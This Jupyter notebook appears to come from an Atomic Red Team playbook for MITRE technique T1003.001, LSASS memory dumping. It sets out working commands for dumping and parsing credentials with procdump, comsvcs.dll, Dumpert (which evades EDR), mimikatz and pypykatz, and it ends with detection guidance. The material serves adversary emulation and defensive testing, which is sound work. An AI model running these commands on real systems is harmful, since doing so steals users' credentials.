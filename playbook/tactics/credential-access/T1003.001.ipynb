{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# T1003.001 - OS Credential Dumping: LSASS Memory",
    "\n",
    "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run using:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\n\nWindows Security Support Provider (SSP) DLLs are loaded into LSSAS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)\n\nThe following SSPs can be used to access credentials:\n\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Atomic Tests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Import the Module before running the tests.\nImport-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Windows Credential Editor\nDump user credentials using Windows Credential Editor (supports Windows XP, 2003, Vista, 7, 2008 and Windows 8 only)\n\nUpon successful execution, you should see a file with user passwords/hashes at %temp%/wce-output.file.\n\nIf you see no output it is likely that execution was blocked by Anti-Virus. \n\nIf you see a message saying \\\"wce.exe is not recognized as an internal or external command\\\", try using the  get-prereq_commands to download and install Windows Credential Editor first.\n\n**Supported Platforms:** windows\n#### Attack Commands: Run with `command_prompt`\n```command_prompt\n#{wce_exe} -o #{output_file}\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1003.001 -TestNumbers 1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Dump LSASS.exe Memory using ProcDump\nThe memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump.\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n\n**Supported Platforms:** windows\n#### Attack Commands: Run with `command_prompt`\n```command_prompt\n#{procdump_exe} -accepteula -ma lsass.exe #{output_file}\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1003.001 -TestNumbers 2"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Dump LSASS.exe Memory using comsvcs.dll\nThe memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-comsvcs.dmp.\n\n**Supported Platforms:** windows\n#### Attack Commands: Run with `powershell`\n```powershell\nC:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1003.001 -TestNumbers 3"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Dump LSASS.exe Memory using direct system calls and API unhooking\nThe memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid detection. \nhttps://github.com/outflanknl/Dumpert\nhttps://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\nUpon successful execution, you should see the following file created C:\\\\windows\\\\temp\\\\dumpert.dmp.\n\nIf you see a message saying \\\"The system cannot find the path specified.\\\", try using the  get-prereq_commands to download the  tool first.\n\n**Supported Platforms:** windows\n#### Attack Commands: Run with `command_prompt`\n```command_prompt\n#{dumpert_exe}\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1003.001 -TestNumbers 4"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - Dump LSASS.exe Memory using Windows Task Manager\nThe memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task\nManager and administrative permissions.\n\n**Supported Platforms:** windows\nRun it with these steps!\n1\n.\n \nO\np\ne\nn\n \nT\na\ns\nk\n \nM\na\nn\na\ng\ne\nr\n:\n\n\n \n \nO\nn\n \na\n \nW\ni\nn\nd\no\nw\ns\n \ns\ny\ns\nt\ne\nm\n \nt\nh\ni\ns\n \nc\na\nn\n \nb\ne\n \na\nc\nc\no\nm\np\nl\ni\ns\nh\ne\nd\n \nb\ny\n \np\nr\ne\ns\ns\ni\nn\ng\n \nC\nT\nR\nL\n-\nA\nL\nT\n-\nD\nE\nL\n \na\nn\nd\n \ns\ne\nl\ne\nc\nt\ni\nn\ng\n \nT\na\ns\nk\n \nM\na\nn\na\ng\ne\nr\n \no\nr\n \nb\ny\n \nr\ni\ng\nh\nt\n-\nc\nl\ni\nc\nk\ni\nn\ng\n\n\n \n \no\nn\n \nt\nh\ne\n \nt\na\ns\nk\n \nb\na\nr\n \na\nn\nd\n \ns\ne\nl\ne\nc\nt\ni\nn\ng\n \n\"\nT\na\ns\nk\n \nM\na\nn\na\ng\ne\nr\n\"\n.\n\n\n\n\n2\n.\n \nS\ne\nl\ne\nc\nt\n \nl\ns\na\ns\ns\n.\ne\nx\ne\n:\n\n\n \n \nI\nf\n \nl\ns\na\ns\ns\n.\ne\nx\ne\n \ni\ns\n \nn\no\nt\n \nv\ni\ns\ni\nb\nl\ne\n,\n \ns\ne\nl\ne\nc\nt\n \n\"\nS\nh\no\nw\n \np\nr\no\nc\ne\ns\ns\ne\ns\n \nf\nr\no\nm\n \na\nl\nl\n \nu\ns\ne\nr\ns\n\"\n.\n \nT\nh\ni\ns\n \nw\ni\nl\nl\n \na\nl\nl\no\nw\n \ny\no\nu\n \nt\no\n \no\nb\ns\ne\nr\nv\ne\n \ne\nx\ne\nc\nu\nt\ni\no\nn\n \no\nf\n \nl\ns\na\ns\ns\n.\ne\nx\ne\n\n\n \n \na\nn\nd\n \ns\ne\nl\ne\nc\nt\n \ni\nt\n \nf\no\nr\n \nm\na\nn\ni\np\nu\nl\na\nt\ni\no\nn\n.\n\n\n\n\n3\n.\n \nD\nu\nm\np\n \nl\ns\na\ns\ns\n.\ne\nx\ne\n \nm\ne\nm\no\nr\ny\n:\n\n\n \n \nR\ni\ng\nh\nt\n-\nc\nl\ni\nc\nk\n \no\nn\n \nl\ns\na\ns\ns\n.\ne\nx\ne\n \ni\nn\n \nT\na\ns\nk\n \nM\na\nn\na\ng\ne\nr\n.\n \nS\ne\nl\ne\nc\nt\n \n\"\nC\nr\ne\na\nt\ne\n \nD\nu\nm\np\n \nF\ni\nl\ne\n\"\n.\n \nT\nh\ne\n \nf\no\nl\nl\no\nw\ni\nn\ng\n \nd\ni\na\nl\no\ng\n \nw\ni\nl\nl\n \ns\nh\no\nw\n \ny\no\nu\n \nt\nh\ne\n \np\na\nt\nh\n \nt\no\n \nt\nh\ne\n \ns\na\nv\ne\nd\n \nf\ni\nl\ne\n.\n\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - Offline Credential Theft With Mimikatz\nThe memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with\nMimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.\n\n**Supported Platforms:** windows\n#### Attack Commands: Run with `command_prompt`\n```command_prompt\n#{mimikatz_exe} \"sekurlsa::minidump #{input_file}\" \"sekurlsa::logonpasswords full\" exit\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1003.001 -TestNumbers 6"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - LSASS read with pypykatz\nParses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::\n\nPython 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.\n\nSuccessful execution of this test will display multiple useranames and passwords/hashes to the screen.\n\n**Supported Platforms:** windows\n#### Attack Commands: Run with `command_prompt`\n```command_prompt\npypykatz live lsa\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-AtomicTest T1003.001 -TestNumbers 7"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Detection",
    "\n",
    "Monitor for unexpected processes interacting with LSASS.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as Mimikatz access LSASS.exe by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [Process Injection](https://attack.mitre.org/techniques/T1055) to reduce potential indicators of malicious activity.\n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis."
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}